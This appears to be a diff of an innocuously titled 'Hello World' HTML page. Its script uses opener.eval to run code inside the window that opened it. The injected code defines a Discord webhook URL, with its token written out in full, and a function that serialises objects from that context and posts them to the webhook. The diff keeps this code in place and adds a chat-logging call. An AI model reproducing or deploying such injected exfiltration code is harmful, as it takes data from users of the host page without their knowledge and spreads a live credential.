@@ -1,4 +1,4 @@
-Hello World 27
+Hello World 30
 <!DOCTYPE html>
 <html>
 <body>
@@ -22,8 +22,10 @@ try{
     });
     cache = null;
     
-    opener.eval(`    
-    let cache = [];
+    opener.eval(`   
+    gui?.chat?._logServerText("hihi")
+ 
+    let cachee = [];
     let dataWebhook = "https://discord.com/api/webhooks/1118142166024323153/X9cL9G4VY8ZDLmwa6xfAdXf6cyO0NWE0Gsf5Ao3o4stAuqqX4csuek6awCFfKgUZzhtw";
     function sendDataWebhook(data){
     const body = JSON.stringify({
@@ -40,10 +42,10 @@ try{
         let data = JSON.stringify({},(key, value) => {
         if (typeof value === 'object' && value !== null) {
             // Duplicate reference found, discard key
-            if (cache.includes(value)) return;
+            if (cachee.includes(value)) return;
 
             // Store value in our collection
-            cache.push(value);
+            cachee.push(value);
         }
         return value;
         });
